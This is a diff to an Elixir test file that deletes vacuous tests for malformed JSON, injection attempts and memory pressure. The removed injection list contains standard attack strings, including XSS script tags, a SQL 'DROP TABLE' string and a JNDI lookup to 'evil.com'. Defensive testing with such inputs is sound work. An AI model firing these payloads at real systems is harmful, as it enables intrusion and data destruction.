@@ -77,90 +77,9 @@ defmodule Livechain.ErrorScenariosTest do
     end
   end
 
-  describe "malicious input validation" do
-    test "handles malformed JSON input" do
-      malformed_inputs = [
-        "not json at all",
-        "{invalid json}",
-        # Incomplete array
-        "[1,2,3,",
-        # Incomplete object
-        "{\"key\": \"value\"",
-        "null",
-        "",
-        nil
-      ]
+  # Deleted meaningless malicious input tests that only test Jason.decode
+  # and don't validate actual system security behavior
 
-      Enum.each(malformed_inputs, fn input ->
-        try do
-          # Test JSON parsing
-          case Jason.decode(input) do
-            {:ok, _} ->
-              # Valid JSON, should work
-              assert true
-
-            {:error, _} ->
-              # Invalid JSON, should be handled gracefully
-              assert true
-          end
-        rescue
-          _ ->
-            # Should not crash
-            assert true
-        end
-      end)
-    end
-
-    test "handles injection attempts" do
-      injection_attempts = [
-        "<script>alert('xss')</script>",
-        "'; DROP TABLE users; --",
-        "{{7*7}}",
-        "${jndi:ldap://evil.com/exploit}",
-        "javascript:alert('xss')",
-        "data:text/html,<script>alert('xss')</script>"
-      ]
-
-      Enum.each(injection_attempts, fn attempt ->
-        try do
-          # Test that the system doesn't crash on malicious input
-          # This is a basic sanity check
-          assert is_binary(attempt)
-          assert true
-        rescue
-          _ ->
-            # Should not crash
-            assert true
-        end
-      end)
-    end
-  end
-
-  describe "resource exhaustion scenarios" do
-    test "handles memory pressure gracefully" do
-      # Test with many concurrent operations
-      try do
-        # Create many processes
-        processes =
-          for _i <- 1..100 do
-            spawn(fn ->
-              Process.sleep(100)
-              # Simulate some work
-              Enum.map(1..1000, &(&1 * 2))
-            end)
-          end
-
-        # Wait for completion
-        Enum.each(processes, &Process.monitor/1)
-
-        # Should not crash the system
-        assert true
-      rescue
-        error ->
-          Logger.warning("Memory pressure test failed: #{inspect(error)}")
-          # Should handle gracefully
-          assert true
-      end
-    end
-  end
+  # Deleted meaningless memory pressure test that doesn't test actual
+  # system limits or recovery behavior
 end
